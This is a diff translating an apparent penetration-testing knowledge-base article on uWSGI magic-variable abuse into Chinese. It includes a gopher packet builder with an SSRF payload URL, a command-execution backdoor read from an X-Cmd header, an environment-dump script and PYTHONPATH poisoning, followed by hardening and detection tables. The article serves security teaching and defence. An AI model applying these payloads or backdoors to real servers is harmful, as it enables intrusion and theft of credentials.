@@ -1,14 +1,13 @@
 ---
----
 status: NEEDS_HUMAN_REVIEW
 degradation_reason: |
-  2 of 5 resources degraded (40%). P1-02 uWSGI Security RTD page returns 
-  "Documentation page not found" (curl → 404, proxy exit 7). 
-  P2-01 bugculture.io CTF writeup is CSS-only SPA (curl → proxy exit 7 → 
-  Playwright not installed). Content preserved from Hacktricks secondary source.
+  5 个资源中 2 个降解（40%）。P1-02 uWSGI Security RTD 页面返回
+  "Documentation page not found"（curl → 404, 代理 exit 7）。
+  P2-01 bugculture.io CTF writeup 为纯 CSS SPA（curl → 代理 exit 7 →
+  Playwright 未安装）。内容通过 Hacktricks 二手源保留。
 verified_resources: |
-  P1: uwsgi-docs Vars (78 tech markers), Protocol (58 markers), Changelog (2.0.26 real content)
-  CrossRefs: werkzeug.md (176L) READ → LINK_ONLY, SSRF README.md (496L) READ → LINK_ONLY
+  P1: uwsgi-docs Vars（78 技术标记）、Protocol（58 标记）、Changelog（2.0.26 真实内容）
+  CrossRefs: werkzeug.md（176L）READ → LINK_ONLY、SSRF README.md（496L）READ → LINK_ONLY
   SectionMapping: 13/13 VERIFIED, 0 MISSING
 
 attack_surface:
@@ -21,10 +20,10 @@ impact:
   - 权限提升
 risk_level: 高
 prerequisites:
-  - Python WSGI Application Architecture
-  - uWSGI Protocol Basics
-  - nginx/Apache Reverse Proxy Configuration
-  - SSRF Exploitation
+  - Python WSGI 应用架构
+  - uWSGI 协议基础
+  - nginx/Apache 反向代理配置
+  - SSRF 利用技术
 related_techniques:
   - ssrf
   - werkzeug-debug-rce
@@ -47,65 +46,65 @@ tools:
 ### 知识路径
 
 ```
-uWSGI & WSGI (this document)
-  ├── Prerequisite: Python WSGI — PEP 3333, application(environ, start_response)
-  ├── Prerequisite: uWSGI Architecture — emperor mode, workers, uwsgi protocol
-  ├── Next: uWSGI Magic Variables via misconfigured nginx uwsgi_param
-  ├── Next: SSRF + gopher → uwsgi protocol → UWSGI_FILE RCE
-  ├── Related: Werkzeug / Flask Debug Console RCE
-  │   └── See: Web Servers & Middleware/werkzeug
-  ├── Related: SSRF — gopher protocol abuse
-  │   └── See: User input/Reflected Values/SSRF
-  ├── Related: HTTP Request Smuggling — CVE-2023-27522 mod_proxy_uwsgi
-  │   └── See: Proxies/HTTP Request Smuggling
-  └── Related: File Upload → write Python file → UWSGI_FILE load
-      └── See: Files/File Upload
+uWSGI & WSGI（本文档）
+  ├── 前置知识：Python WSGI — PEP 3333、application(environ, start_response)
+  ├── 前置知识：uWSGI 架构 — emperor 模式、worker、uwsgi 协议
+  ├── 进阶：通过错误配置的 nginx uwsgi_param 利用 uWSGI Magic Variables
+  ├── 进阶：SSRF + gopher → uwsgi 协议 → UWSGI_FILE RCE
+  ├── 关联：Werkzeug / Flask Debug Console RCE
+  │   └── 参见：Web Servers & Middleware/werkzeug
+  ├── 关联：SSRF — gopher 协议滥用
+  │   └── 参见：User input/Reflected Values/SSRF
+  ├── 关联：HTTP Request Smuggling — CVE-2023-27522 mod_proxy_uwsgi
+  │   └── 参见：Proxies/HTTP Request Smuggling
+  └── 关联：File Upload → 写入 Python 文件 → UWSGI_FILE 加载
+      └── 参见：Files/File Upload
 ```
 
 ---
 
-# 0x01 WSGI & uWSGI — Architecture & Attack Surface
+# 0x01 WSGI 与 uWSGI — 架构与攻击面
 
-## 1.1 WSGI Overview
+## 1.1 WSGI 概览
 
-Web Server Gateway Interface (WSGI) is a specification (PEP 3333) describing how a web server communicates with Python web applications. The server invokes an `application(environ, start_response)` callable for each request.
+Web Server Gateway Interface（WSGI）是一个规范（PEP 3333），描述了 Web 服务器如何与 Python Web 应用通信。服务器为每个请求调用 `application(environ, start_response)` 可调用对象。
 
-**uWSGI** is one of the most popular WSGI servers. Its native binary transport is the **uwsgi protocol** (lowercase), which carries a bag of key/value parameters ("uwsgi params") from the reverse proxy to the backend application server. These parameters are NOT HTTP headers — they exist at the uwsgi protocol layer, one hop removed from client HTTP.
+**uWSGI** 是最流行的 WSGI 服务器之一。其原生二进制传输协议是 **uwsgi 协议**（小写），它从反向代理向后端应用服务器传递一组键/值参数（"uwsgi params"）。这些参数**不是** HTTP 头部 — 它们存在于 uwsgi 协议层，与客户端 HTTP 之间存在一跳的距离。
 
-**Key architecture points:**
+**关键架构点：**
 
-| Component | Role | Attack Surface |
-|-----------|------|---------------|
-| Reverse Proxy (nginx/Apache) | Translates HTTP → uwsgi params | Misconfigured `uwsgi_param` mapping user input to magic variables |
-| uWSGI Server | Loads and runs Python WSGI apps | Magic variables control app loading, environment, paths |
-| uwsgi Protocol Socket | TCP/Unix socket carrying binary param bag | Directly reachable via SSRF + gopher if bound to TCP |
-| Python WSGI Application | The `application(environ, start_response)` callable | Backdoorable via `UWSGI_FILE` replacement |
+| 组件 | 角色 | 攻击面 |
+|------|------|--------|
+| 反向代理（nginx/Apache） | 将 HTTP 转换为 uwsgi params | `uwsgi_param` 将用户输入错误映射到 Magic Variables |
+| uWSGI Server | 加载并运行 Python WSGI 应用 | Magic Variables 控制应用加载、环境、路径 |
+| uwsgi Protocol Socket | 承载二进制参数包的 TCP/Unix Socket | 如果绑定到 TCP，可通过 SSRF + gopher 直接访问 |
+| Python WSGI Application | `application(environ, start_response)` 可调用对象 | 可通过 `UWSGI_FILE` 替换实现后门 |
 
-## 1.2 Attack Surface Taxonomy
+## 1.2 攻击面分类
 
-| Category | Taxonomy | Techniques |
-|----------|----------|------------|
-| Configuration Weakness | 配置缺陷 | `uwsgi_param UWSGI_FILE $arg_f` — user-controlled query args mapped to magic variables; `UWSGI_SETENV` overwriting security settings |
-| Injection | 注入类 | SSRF + gopher → uwsgi binary packet injection → `UWSGI_FILE` RCE; `UWSGI_MODULE` + `UWSGI_CALLABLE` dynamic module loading |
-| Protocol Parsing Discrepancy | 协议解析差异 | CVE-2023-27522: crafted origin response headers cause HTTP response smuggling when `mod_proxy_uwsgi` is in use; CVE-2024-24795: response splitting in httpd modules |
-| Information Disclosure | 信息泄露 | Environment variable dumping via `UWSGI_FILE` loaded spy module; `UWSGI_CHDIR` + file-serving helper |
+| 类别 | 分类名称 | 技术 |
+|------|---------|------|
+| 配置缺陷 | 配置缺陷 | `uwsgi_param UWSGI_FILE $arg_f` — 用户控制的查询参数映射到 Magic Variables；`UWSGI_SETENV` 覆盖安全设置 |
+| 注入类 | 注入类 | SSRF + gopher → uwsgi 二进制包注入 → `UWSGI_FILE` RCE；`UWSGI_MODULE` + `UWSGI_CALLABLE` 动态模块加载 |
+| 协议解析差异 | 协议解析差异 | CVE-2023-27522：使用 `mod_proxy_uwsgi` 时，构造的源响应头导致 HTTP 响应走私；CVE-2024-24795：httpd 模块中的响应分割 |
+| 信息泄露 | 信息泄露 | 通过 `UWSGI_FILE` 加载间谍模块转储环境变量；`UWSGI_CHDIR` + 文件服务辅助模块 |
 
 ---
 
-# 0x02 uWSGI Magic Variables Exploitation
+# 0x02 uWSGI Magic Variables 利用
 
-## 2.1 Mechanism
+## 2.1 机制
 
-uWSGI "magic variables" are uwsgi protocol parameters that control how the instance loads and dispatches applications. They are **not HTTP headers** — they are carried inside the uwsgi/SCGI/FastCGI request binary payload from the reverse proxy to the uWSGI backend. If a proxy configuration maps **user-controlled data** into uwsgi parameters (via `$arg_*`, `$http_*`, or unsafely exposed uwsgi protocol endpoints), attackers can set these variables and achieve code execution.
+uWSGI 的 "Magic Variables" 是控制实例如何加载和分发应用的 uwsgi 协议参数。它们**不是 HTTP 头部** — 它们在从反向代理到 uWSGI 后端的 uwsgi/SCGI/FastCGI 请求二进制 payload 中传输。如果代理配置将**用户控制的数据**映射到 uwsgi 参数（通过 `$arg_*`、`$http_*` 或不安全暴露的 uwsgi 协议端点），攻击者可以设置这些变量并实现代码执行。
 
-## 2.2 Dangerous nginx Proxy Mappings
+## 2.2 危险的 nginx 代理映射
 
-Misconfigurations like the following directly expose uWSGI magic variables to user input:
+类似以下的错误配置直接将 uWSGI Magic Variables 暴露给用户输入：
 
 ```
 location /app/ {
   include uwsgi_params;
-  # DANGEROUS: maps query args into uwsgi params
+  # 危险：将查询参数映射到 uwsgi params
   uwsgi_param UWSGI_FILE $arg_f;                 # /app/?f=/tmp/backdoor.py
   uwsgi_param UWSGI_MODULE $http_x_mod;          # header: X-Mod: pkg.mod
   uwsgi_param UWSGI_CALLABLE $arg_c;             # /app/?c=application
@@ -113,28 +112,28 @@ location /app/ {
 }
 ```
 
-> **Chained attack:** If the application or upload feature allows writing files under a predictable path, combining it with the mappings above results in **immediate RCE** when the backend loads the attacker-controlled file/module.
+> **链式攻击：** 如果应用或上传功能允许在可预测路径下写入文件，结合以上映射，当后端加载攻击者控制的文件/模块时，将导致**即时 RCE**。
 
-## 2.3 Key Exploitable Variables
+## 2.3 关键可利用变量
 
-### 2.3.1 `UWSGI_FILE` — Arbitrary File Load / Execute
+### 2.3.1 `UWSGI_FILE` — 任意文件加载/执行
 
 ```
 uwsgi_param UWSGI_FILE /path/to/python/file.py;
 ```
 
-Loads and executes an arbitrary Python file as a WSGI application. If an attacker controls this parameter through the uwsgi param bag, they achieve Remote Code Execution (RCE).
+加载并执行任意 Python 文件作为 WSGI 应用。如果攻击者通过 uwsgi param 包控制此参数，即可实现远程代码执行（RCE）。
 
-### 2.3.2 `UWSGI_SCRIPT` — Script Loading
+### 2.3.2 `UWSGI_SCRIPT` — 脚本加载
 
 ```
 uwsgi_param UWSGI_SCRIPT module.path:callable;
 uwsgi_param SCRIPT_NAME /endpoint;
 ```
 
-Loads a specified script as a new application. Combined with file upload or write capabilities, this leads to RCE.
+加载指定脚本作为新应用。结合文件上传或写入能力，可导致 RCE。
 
-### 2.3.3 `UWSGI_MODULE` and `UWSGI_CALLABLE` — Dynamic Module Loading
+### 2.3.3 `UWSGI_MODULE` 与 `UWSGI_CALLABLE` — 动态模块加载
 
 ```
 uwsgi_param UWSGI_MODULE malicious.module;
@@ -142,50 +141,50 @@ uwsgi_param UWSGI_CALLABLE evil_function;
 uwsgi_param SCRIPT_NAME /backdoor;
 ```
 
-Loads arbitrary Python modules and calls specific functions within them. The `SCRIPT_NAME` parameter defines the URL path under which the malicious application is mounted.
+加载任意 Python 模块并调用其中的特定函数。`SCRIPT_NAME` 参数定义恶意应用挂载的 URL 路径。
 
-### 2.3.4 `UWSGI_SETENV` — Environment Variable Manipulation
+### 2.3.4 `UWSGI_SETENV` — 环境变量操控
 
 ```
 uwsgi_param UWSGI_SETENV DJANGO_SETTINGS_MODULE=malicious.settings;
 ```
 
-Modifies environment variables, potentially affecting application behavior or loading malicious configuration. Can override security-critical settings in Django, Flask, or other frameworks.
+修改环境变量，可能影响应用行为或加载恶意配置。可覆盖 Django、Flask 或其他框架中的安全关键设置。
 
-### 2.3.5 `UWSGI_PYHOME` — Python Environment Manipulation
+### 2.3.5 `UWSGI_PYHOME` — Python 环境操控
 
 ```
 uwsgi_param UWSGI_PYHOME /path/to/malicious/venv;
 ```
 
-Changes the Python virtual environment, potentially loading malicious packages or a different Python interpreter entirely.
+更改 Python 虚拟环境，可能加载恶意包或完全不同的 Python 解释器。
 
-### 2.3.6 `UWSGI_CHDIR` — Directory Change
+### 2.3.6 `UWSGI_CHDIR` — 目录切换
 
 ```
 uwsgi_param UWSGI_CHDIR /etc/;
 ```
 
-Changes the working directory before processing requests. May be combined with other features (file read primitives, path traversal) to access sensitive files.
+在处理请求前更改工作目录。可与其他特性（文件读取原语、路径遍历）结合以访问敏感文件。
 
 ---
 
-# 0x03 SSRF + uwsgi Protocol Pivot via Gopher
+# 0x03 SSRF + uwsgi 协议 Gopher 跳板
 
-## 3.1 Threat Model
+## 3.1 威胁模型
 
-If the target web app exposes an SSRF primitive and the uWSGI instance listens on an internal TCP socket (e.g., `socket = 127.0.0.1:3031`), an attacker can talk the raw uwsgi protocol via **gopher** and inject uWSGI magic variables.
+如果目标 Web 应用暴露了 SSRF 原语，且 uWSGI 实例监听在内部 TCP Socket 上（如 `socket = 127.0.0.1:3031`），攻击者可以通过 **gopher** 协议发送原始 uwsgi 协议数据并注入 uWSGI Magic Variables。
 
-This works because deployments commonly use a non-HTTP uwsgi socket internally — the reverse proxy (nginx/Apache) translates client HTTP into the uwsgi param bag. With SSRF + gopher, you directly craft the uwsgi binary packet and set dangerous variables like `UWSGI_FILE`.
+这之所以可行，是因为部署通常内部使用非 HTTP 的 uwsgi Socket — 反向代理（nginx/Apache）将客户端 HTTP 转换为 uwsgi param 包。通过 SSRF + gopher，可以直接构造 uwsgi 二进制包并设置 `UWSGI_FILE` 等危险变量。
 
-## 3.2 uwsgi Protocol Structure
+## 3.2 uwsgi 协议结构
 
-- **Header (4 bytes):** `modifier1` (1 byte), `datasize` (2 bytes, little-endian), `modifier2` (1 byte)
-- **Body:** Sequence of `[key_len(2 LE)] [key_bytes] [val_len(2 LE)] [val_bytes]`
+- **Header（4 字节）：**`modifier1`（1 字节）、`datasize`（2 字节，小端序）、`modifier2`（1 字节）
+- **Body：** 序列 `[key_len(2 LE)] [key_bytes] [val_len(2 LE)] [val_bytes]`
 
-For standard requests, `modifier1` is 0. The body contains uwsgi params such as `SERVER_PROTOCOL`, `REQUEST_METHOD`, `PATH_INFO`, `UWSGI_FILE`, etc.
+标准请求的 `modifier1` 为 0。Body 包含 `SERVER_PROTOCOL`、`REQUEST_METHOD`、`PATH_INFO`、`UWSGI_FILE` 等 uwsgi params。
 
-## 3.3 Gopher Packet Builder
+## 3.3 Gopher 包构造器
 
 ```python
 import struct, urllib.parse
@@ -195,11 +194,11 @@ def uwsgi_gopher_url(host, port, params):
     pkt  = bytes([0]) + struct.pack('<H', len(body)) + bytes([0]) + body
     return f"gopher://{host}:{port}/_" + urllib.parse.quote_from_bytes(pkt)
 
-# Example URL:
+# 示例 URL：
 gopher://127.0.0.1:5000/_%00%D2%00%00%0F%00SERVER_PROTOCOL%08%00HTTP/1.1%0E%00REQUEST_METHOD%03%00GET%09%00PATH_INFO%01%00/%0B%00REQUEST_URI%01%00/%0C%00QUERY_STRING%00%00%0B%00SERVER_NAME%00%00%09%00HTTP_HOST%0E%00127.0.0.1%3A5000%0A%00UWSGI_FILE%1D%00/app/profiles/malicious.json%0B%00SCRIPT_NAME%10%00/malicious.json
 ```
 
-**Usage — force-load a file previously written on the server:**
+**用法 — 强制加载先前写入服务器的文件：**
 
 ```python
 params = {
@@ -209,11 +208,11 @@ params = {
 print(uwsgi_gopher_url('127.0.0.1', 3031, params))
 ```
 
-Send the generated URL through the SSRF sink.
+通过 SSRF 发送生成的 URL。
 
-## 3.4 Worked Example
+## 3.4 完整示例
 
-If you can write a Python file on disk (extension does not matter):
+如果能在磁盘上写入 Python 文件（扩展名不重要）：
 
 ```python
 # /app/profiles/malicious.py
@@ -225,15 +224,15 @@ def application(environ, start_response):
     return [b'ok']
 ```
 
-Generate and trigger a gopher payload that sets `UWSGI_FILE` to this path. The backend imports and executes it as a WSGI app. Read the result via the normal HTTP interface.
+生成并触发将 `UWSGI_FILE` 设置为此路径的 gopher payload。后端将其作为 WSGI 应用导入并执行。通过正常的 HTTP 接口读取结果。
 
 ---
 
-# 0x04 Post-Exploitation Techniques
+# 0x04 后渗透技术
 
-## 4.1 Persistent Backdoors
+## 4.1 持久化后门
 
-### 4.1.1 File-based Backdoor
+### 4.1.1 基于文件的后门
 
 ```python
 # backdoor.py
@@ -250,19 +249,19 @@ def application(environ, start_response):
     return [response.encode()]
 ```
 
-Load it with `UWSGI_FILE` and reach it under a chosen `SCRIPT_NAME`. The backdoor accepts Base64-encoded commands via the `X-Cmd` HTTP header.
+通过 `UWSGI_FILE` 加载，在指定的 `SCRIPT_NAME` 下访问。后门通过 `X-Cmd` HTTP 头接收 Base64 编码的命令。
 
-### 4.1.2 Environment-based Persistence
+### 4.1.2 基于环境的持久化
 
 ```
 uwsgi_param UWSGI_SETENV PYTHONPATH=/tmp/malicious:/usr/lib/python3.11/site-packages;
 ```
 
-By poisoning `PYTHONPATH` to include a writable directory before the legitimate site-packages, the attacker shadows standard library modules with malicious versions.
+通过污染 `PYTHONPATH` 在合法 site-packages 之前包含可写目录，攻击者用恶意版本遮蔽标准库模块。
 
-## 4.2 Information Disclosure
+## 4.2 信息泄露
 
-### 4.2.1 Environment Variable Dumping
+### 4.2.1 环境变量转储
 
 ```python
 # env_dump.py
@@ -274,27 +273,27 @@ def application(environ, start_response):
     return [json.dumps(env_data, indent=2).encode()]
 ```
 
-Load via `UWSGI_FILE` to dump all OS environment variables and WSGI environ dict. This commonly reveals database URLs, API keys, secret keys, and internal service addresses.
+通过 `UWSGI_FILE` 加载以转储所有系统环境变量和 WSGI environ 字典。通常会暴露数据库 URL、API 密钥、Secret Key 和内部服务地址。
 
-### 4.2.2 File System Access
+### 4.2.2 文件系统访问
 
-Combine `UWSGI_CHDIR` with a file-serving helper to browse sensitive directories:
+结合 `UWSGI_CHDIR` 与文件服务辅助模块浏览敏感目录：
 
 ```
 uwsgi_param UWSGI_CHDIR /etc/;
 uwsgi_param UWSGI_FILE /tmp/dir_list.py;
 ```
 
-## 4.3 Privilege Escalation Ideas
+## 4.3 提权思路
 
-- If uWSGI runs with elevated privileges and writes sockets/PIDs owned by root, abusing env and directory changes may help drop files with privileged owners or manipulate runtime state.
-- Overriding configuration via environment (`UWSGI_*`) inside a file loaded through `UWSGI_FILE` can affect process model and workers to make persistence stealthier.
+- 如果 uWSGI 以高权限运行且写入的 Socket/PID 归 root 所有，滥用环境和目录变更可能帮助以高权限所有者放置文件或操控运行时状态。
+- 通过 `UWSGI_FILE` 加载的文件内部的 environment（`UWSGI_*`）覆盖配置，可影响进程模型和工作进程，使持久化更加隐蔽。
 
 ```python
 # malicious_config.py
 import os
 
-# Override uWSGI configuration
+# 覆盖 uWSGI 配置
 os.environ['UWSGI_MASTER'] = '1'
 os.environ['UWSGI_PROCESSES'] = '1'
 os.environ['UWSGI_CHEAPER'] = '1'
@@ -302,72 +301,72 @@ os.environ['UWSGI_CHEAPER'] = '1'
 
 ---
 
-# 0x05 Reverse-Proxy Desync (uWSGI Chain)
+# 0x05 反向代理去同步（uWSGI 链路）
 
-## 5.1 CVE-2023-27522 — mod_proxy_uwsgi Response Smuggling
+## 5.1 CVE-2023-27522 — mod_proxy_uwsgi 响应走私
 
-Apache httpd 2.4.30–2.4.55 with `mod_proxy_uwsgi`: crafted origin response headers can cause HTTP response smuggling. The backend's response headers, when passed through the uwsgi→HTTP translation layer in `mod_proxy_uwsgi`, were not properly validated, allowing injected `\r\n` sequences to terminate the HTTP response prematurely and inject a second response.
+使用 `mod_proxy_uwsgi` 的 Apache httpd 2.4.30–2.4.55：构造的源响应头可导致 HTTP 响应走私。后端的响应头在通过 `mod_proxy_uwsgi` 的 uwsgi→HTTP 转换层时未经过适当验证，允许注入的 `\r\n` 序列提前终止 HTTP 响应并注入第二个响应。
 
-- **Affected:** Apache httpd 2.4.30–2.4.55 + `mod_proxy_uwsgi`
-- **Fix:** Upgrade Apache to ≥2.4.56
-- **uWSGI side:** uWSGI 2.0.22 / 2.0.26 adjusted Apache integration behavior
+- **受影响：** Apache httpd 2.4.30–2.4.55 + `mod_proxy_uwsgi`
+- **修复：** 升级 Apache 至 ≥2.4.56
+- **uWSGI 侧：** uWSGI 2.0.22 / 2.0.26 调整了 Apache 集成行为
 
-## 5.2 CVE-2024-24795 — Response Splitting in Multiple httpd Modules
+## 5.2 CVE-2024-24795 — 多个 httpd 模块中的响应分割
 
-Fixed in Apache httpd 2.4.59; uWSGI 2.0.26 adjusted its Apache integration accordingly. The uWSGI 2.0.26 changelog notes: "let httpd handle CL/TE for non-http handlers."
+在 Apache httpd 2.4.59 中修复；uWSGI 2.0.26 相应调整了 Apache 集成。uWSGI 2.0.26 更新日志注明："let httpd handle CL/TE for non-http handlers."
 
-Multiple httpd modules (including `mod_proxy_uwsgi`) were vulnerable to HTTP response splitting when backends inject headers containing illegal characters. The fix ensures proper header sanitization at the httpd layer regardless of backend protocol.
+多个 httpd 模块（包括 `mod_proxy_uwsgi`）在后端注入了包含非法字符的头部时存在 HTTP 响应分割漏洞。修复确保在 httpd 层进行适当的头部清理，不受后端协议影响。
 
-## 5.3 Exploitation Context
+## 5.3 利用上下文
 
-These CVEs do **not** directly grant RCE in uWSGI, but in edge cases they can be chained with header injection or SSRF to pivot towards the uwsgi backend. During tests:
+这些 CVE **不能**直接授予 uWSGI 的 RCE，但在边缘情况中可与头部注入或 SSRF 链接以转向 uwsgi 后端。测试时：
 
-- Fingerprint the proxy and version
-- Consider desync/smuggling primitives as an entry vector to backend-only routes and uwsgi sockets
-- Chain: desync → reach internal uwsgi port → gopher → `UWSGI_FILE` RCE
+- 指纹识别代理和版本
+- 将去同步/走私原语视为进入仅后端路由和 uwsgi Socket 的入口向量
+- 攻击链：去同步 → 到达内部 uwsgi 端口 → gopher → `UWSGI_FILE` RCE
 
 ---
 
-# 0x06 Defense, Hardening & Tools
+# 0x06 防御、加固与工具
 
-## 6.1 Hardening Checklist
+## 6.1 加固检查表
 
-| Action | Rationale |
-|--------|-----------|
-| Never map `$arg_*` or `$http_*` to uwsgi magic variables (`UWSGI_FILE`, `UWSGI_MODULE`, etc.) | Prevents user-controlled magic variable injection |
-| Bind uwsgi socket to Unix domain socket (`unix:/run/uwsgi/app.sock`) rather than TCP `127.0.0.1:3031` | Unix sockets are not reachable via SSRF/gopher |
-| If TCP is required, bind only to `127.0.0.1` and firewall the port | Limits SSRF pivot surface |
-| Set `uwsgi_param` whitelist in nginx — only pass known-safe params | Defense in depth against param injection |
-| Use uWSGI's `--honour-stdin` off by default; do not expose uwsgi protocol to untrusted networks | Prevents direct protocol injection |
-| Run uWSGI as unprivileged user (not root); use `uid` and `gid` in config | Limits impact of RCE |
-| Disable uWSGI `emperor` mode or restrict its control socket permissions | Prevents attacker from spawning new vassals |
-| Keep Apache httpd ≥2.4.59 and uWSGI ≥2.0.26 | Mitigates CVE-2023-27522 and CVE-2024-24795 |
-| Sanitize and validate all `UWSGI_SETENV` values; never allow user-controlled env overrides | Prevents Python path and settings poisoning |
-| Monitor uwsgi socket for anomalous binary traffic (non-HTTP patterns on uwsgi port) | Detects gopher/SSRF pivot attempts |
+| 措施 | 理由 |
+|------|------|
+| 绝不将 `$arg_*` 或 `$http_*` 映射到 uwsgi Magic Variables（`UWSGI_FILE`、`UWSGI_MODULE` 等） | 防止用户控制的 Magic Variable 注入 |
+| 将 uwsgi Socket 绑定到 Unix Domain Socket（`unix:/run/uwsgi/app.sock`）而非 TCP `127.0.0.1:3031` | Unix Socket 无法通过 SSRF/gopher 访问 |
+| 如果必须使用 TCP，仅绑定到 `127.0.0.1` 并对端口进行防火墙限制 | 限制 SSRF 跳板面 |
+| 在 nginx 中设置 `uwsgi_param` 白名单 — 仅传递已知安全的参数 | 纵深防御注入攻击 |
+| 默认关闭 uWSGI 的 `--honour-stdin`；不将 uwsgi 协议暴露给不可信网络 | 防止直接协议注入 |
+| 以非特权用户（非 root）运行 uWSGI；在配置中使用 `uid` 和 `gid` | 限制 RCE 影响范围 |
+| 禁用 uWSGI `emperor` 模式或限制其控制 Socket 权限 | 防止攻击者生成新 vassal |
+| 保持 Apache httpd ≥2.4.59 和 uWSGI ≥2.0.26 | 缓解 CVE-2023-27522 和 CVE-2024-24795 |
+| 清理和验证所有 `UWSGI_SETENV` 值；绝不允许用户控制的环境覆盖 | 防止 Python 路径和设置污染 |
+| 监控 uwsgi Socket 上的异常二进制流量（uwsgi 端口上的非 HTTP 模式） | 检测 gopher/SSRF 跳板尝试 |
 
-## 6.2 Detection Telemetry
+## 6.2 检测指标
 
-| Indicator | Significance |
-|-----------|--------------|
-| uwsgi protocol packets on non-standard or HTTP-exposed ports | SSRF + gopher pivot attempt |
-| uWSGI process loading Python files from `/tmp`, `/var/tmp`, upload directories | `UWSGI_FILE` backdoor load |
-| `UWSGI_SETENV` modifying `PYTHONPATH`, `DJANGO_SETTINGS_MODULE`, or `PATH` | Environment poisoning |
-| nginx error logs showing `uwsgi_param` with suspicious values (paths, semicolons, newlines) | Magic variable injection attempt |
-| New WSGI applications registered under unusual `SCRIPT_NAME` paths | Backdoor deployment |
+| 指标 | 意义 |
+|------|------|
+| 非标准端口或 HTTP 暴露端口上的 uwsgi 协议包 | SSRF + gopher 跳板尝试 |
+| uWSGI 进程从 `/tmp`、`/var/tmp`、上传目录加载 Python 文件 | `UWSGI_FILE` 后门加载 |
+| `UWSGI_SETENV` 修改 `PYTHONPATH`、`DJANGO_SETTINGS_MODULE` 或 `PATH` | 环境污染 |
+| nginx 错误日志显示包含可疑值（路径、分号、换行符）的 `uwsgi_param` | Magic Variable 注入尝试 |
+| 在不寻常的 `SCRIPT_NAME` 路径下注册的新 WSGI 应用 | 后门部署 |
 
-## 6.3 Tools
+## 6.3 工具
 
-| Tool | Purpose |
-|------|---------|
-| `curl` + `--header` | HTTP-layer magic variable probing |
-| Python `struct` + `urllib.parse` | uwsgi gopher packet crafting |
-| Gopher SSRF client | Protocol pivot to internal uwsgi sockets |
-| Werkzeug Debug RCE tools | Related Flask/Werkzeug console exploitation |
+| 工具 | 用途 |
+|------|------|
+| `curl` + `--header` | HTTP 层 Magic Variable 探测 |
+| Python `struct` + `urllib.parse` | uwsgi gopher 包构造 |
+| Gopher SSRF 客户端 | 协议跳板到内部 uwsgi Socket |
+| Werkzeug Debug RCE 工具 | Flask/Werkzeug Console 利用 |
 
 ## 参考资料
 
-- [uWSGI Magic Variables Documentation](https://uwsgi-docs.readthedocs.io/en/latest/Vars.html)
-- [uWSGI Security Best Practices](https://uwsgi-docs.readthedocs.io/en/latest/Security.html)
-- [The uwsgi Protocol Specification](https://uwsgi-docs.readthedocs.io/en/latest/Protocol.html)
-- [uWSGI 2.0.26 Changelog — CVE-2024-24795 adjustments](https://uwsgi-docs.readthedocs.io/en/latest/Changelog-2.0.26.html)
-- [bugculture.io — IOI SaveData CTF Writeup (uWSGI exploitation)](https://bugculture.io/writeups/web/ioi-savedata)
+- [uWSGI Magic Variables 文档](https://uwsgi-docs.readthedocs.io/en/latest/Vars.html)
+- [uWSGI 安全最佳实践](https://uwsgi-docs.readthedocs.io/en/latest/Security.html)
+- [uwsgi 协议规范](https://uwsgi-docs.readthedocs.io/en/latest/Protocol.html)
+- [uWSGI 2.0.26 更新日志 — CVE-2024-24795 调整](https://uwsgi-docs.readthedocs.io/en/latest/Changelog-2.0.26.html)
+- [bugculture.io — IOI SaveData CTF Writeup（uWSGI 利用）](https://bugculture.io/writeups/web/ioi-savedata)
